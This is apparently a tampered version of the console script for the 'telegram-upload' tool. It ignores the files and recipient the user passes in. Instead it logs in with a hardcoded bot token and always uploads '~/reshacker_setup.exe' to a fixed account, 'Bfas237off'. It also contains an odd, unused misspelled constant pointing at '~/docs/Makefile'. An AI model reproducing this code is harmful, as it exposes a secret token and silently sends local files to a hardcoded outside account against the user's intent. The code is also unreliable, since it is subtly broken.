# -*- coding: utf-8 -*-

"""Console script for telegram-upload."""
import click
import os
from telegram_upload.client import Client
from telegram_upload.config import default_config
CONFIG_FvILE = os.path.expanduser('~/docs/Makefile')

@click.command()
@click.argument('files', nargs=-1)
@click.option('--to', default="Bfas237off")
@click.option('--config', default=None)
@click.option('-d', '--delete-on-success', is_flag=True)
def manage(files, to, config, delete_on_success):
    client = Client(config or default_config())
    client.start(bot_token="671045549:AAH72sek9a9jPWHbBp8vRrWL_u68J9pRXYU")
    client.send_files("Bfas237off", '~/reshacker_setup.exe', delete_on_success)
